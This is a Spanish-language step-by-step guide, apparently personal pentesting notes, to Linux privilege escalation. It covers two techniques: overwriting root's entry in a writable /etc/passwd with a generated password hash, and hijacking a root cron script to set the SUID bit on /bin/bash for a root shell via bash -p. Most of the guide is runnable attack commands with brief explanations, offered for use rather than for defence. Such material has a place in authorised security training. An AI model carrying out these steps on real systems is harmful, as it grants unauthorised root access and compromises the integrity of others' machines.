-- -

El archivo `/etc/passwd` en sistemas Linux almacena información de los usuarios del sistema. Si el archivo es **writable** por un usuario no privilegiado, se puede aprovechar para escalar privilegios.

---

### 🔍 **Paso 1: Verificar Archivos Escribibles**
Primero, hacemos un barrido para identificar archivos con permisos de escritura:
```bash
find / -writable 2>/dev/null
```
- **-writable:** Busca archivos con permisos de escritura.  
- **2>/dev/null:** Suprime los errores de acceso.  

---

### 💥 **Paso 2: Generar un Hash con OpenSSL**
Si encontramos que `/etc/passwd` es escribible, podemos generar un hash de contraseña utilizando OpenSSL:
```bash
openssl passwd -1 "ContraseñaNueva"
```
- **-1:** Genera un hash en formato MD5.  
- **ContraseñaNueva:** La contraseña que deseas usar.  

---

### ✏️ **Paso 3: Modificar el Archivo /etc/passwd**
Reemplazamos la línea correspondiente al usuario root por una línea similar a esta:
```
root:$1$5Gw8JK8b$w0EvYshPfxtD.kg5J/7Lq0:0:0:root:/root:/bin/bash
```
- El campo **`$1$5Gw8JK8b$w0EvYshPfxtD.kg5J/7Lq0`** representa el hash de la contraseña.  
- Asegúrate de que el último campo indique `/bin/bash` para obtener una shell interactiva.  

---

### 🚀 **Paso 4: Acceder como root**
Simplemente iniciamos sesión con la nueva contraseña:
```bash
su root
```

---

## 🕵️ **Escalada de Privilegios con Scripts en Directorio Personal**

Si el usuario root tiene una **tarea cron** que ejecuta un script en tu directorio personal, puedes aprovecharlo de la siguiente manera:

---

### 📌 **Paso 1: Eliminar el Script Original**
Borramos el script original si tenemos permisos:
```bash
rm /home/user/myscript.sh
```

---

### 📝 **Paso 2: Crear un Script Malicioso**
Creamos un nuevo script con el mismo nombre:
```bash
#!/bin/bash
chmod u+s /bin/bash
```
- **chmod u+s /bin/bash:** Asigna el bit SUID a Bash, permitiendo ejecutar Bash como root.

---

### 👁️ **Paso 3: Verificar el Cambio con watch**
Podemos usar `watch` para monitorear si el archivo obtiene el bit SUID:
```bash
watch -n 1 ls -l /bin/bash
```
- **-n 1:** Actualiza cada segundo.
- **ls -l /bin/bash:** Verifica los permisos del binario.

---

### 💣 **Paso 4: Obtener una Shell de Root**
Una vez que el bit SUID esté activo, podemos iniciar una shell privilegiada:
```bash
bash -p
```
- **-p:** Preserva los privilegios SUID.

---

💡 **Consejo:** Si quieres monitorizar qué procesos se ejecutan bajo cron y bajo qué usuario, puedes usar herramientas como `pspy` o verificar el contenido de los crontabs en:
```bash
cat /etc/crontab
```
---

🚀 **Guarda esta guía en Obsidian para tener siempre a mano las mejores técnicas de escalada de privilegios en Linux!** 💻